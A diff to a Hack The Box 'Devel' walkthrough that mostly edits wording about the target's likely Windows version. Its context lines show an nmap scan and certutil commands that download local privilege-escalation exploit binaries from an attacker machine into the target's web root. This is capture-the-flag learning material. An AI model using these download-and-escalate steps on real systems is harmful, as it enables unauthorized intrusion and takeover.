@@ -5,8 +5,8 @@
 ```
 sudo nmap -sC -sS -sV -A 10.10.10.5
 ```
-* The results of the Nmap show that TCP port 21 and 80 are open. Target machine OS is likely Windows Server 2008 R2.
-* Google search revealed that IIS/7.5 is mapped to Windows Server 2008 R2
+* The results of the Nmap show that TCP port 21 and 80 are open. Target machine OS is likely Windows Server 2008 R2 or Windows 7.
+* Google search revealed that IIS/7.5 is mapped to Windows Server 2008 R2 or Windows 7.
 
 ```
 PORT   STATE SERVICE VERSION
@@ -255,7 +255,7 @@ kali@kali:~/HTB/devel$ wget https://github.com/offensive-security/exploitdb-bin-
 certutil -urlcache -split -f http://10.10.14.10/37049-32.exe c:\inetpub\wwwroot\37049-32.exe
 ```
 
-* Repeat steps for MS14-40. Successfully Priv Esc
+* Repeat steps for MS14-40. Successfully Priv Esc.
 
 ```
 C:\inetpub\wwwroot>certutil -urlcache -split -f http://10.10.14.10/MS14-40-x86.exe c:\inetpub\wwwroot\MS14-40-x86.exe
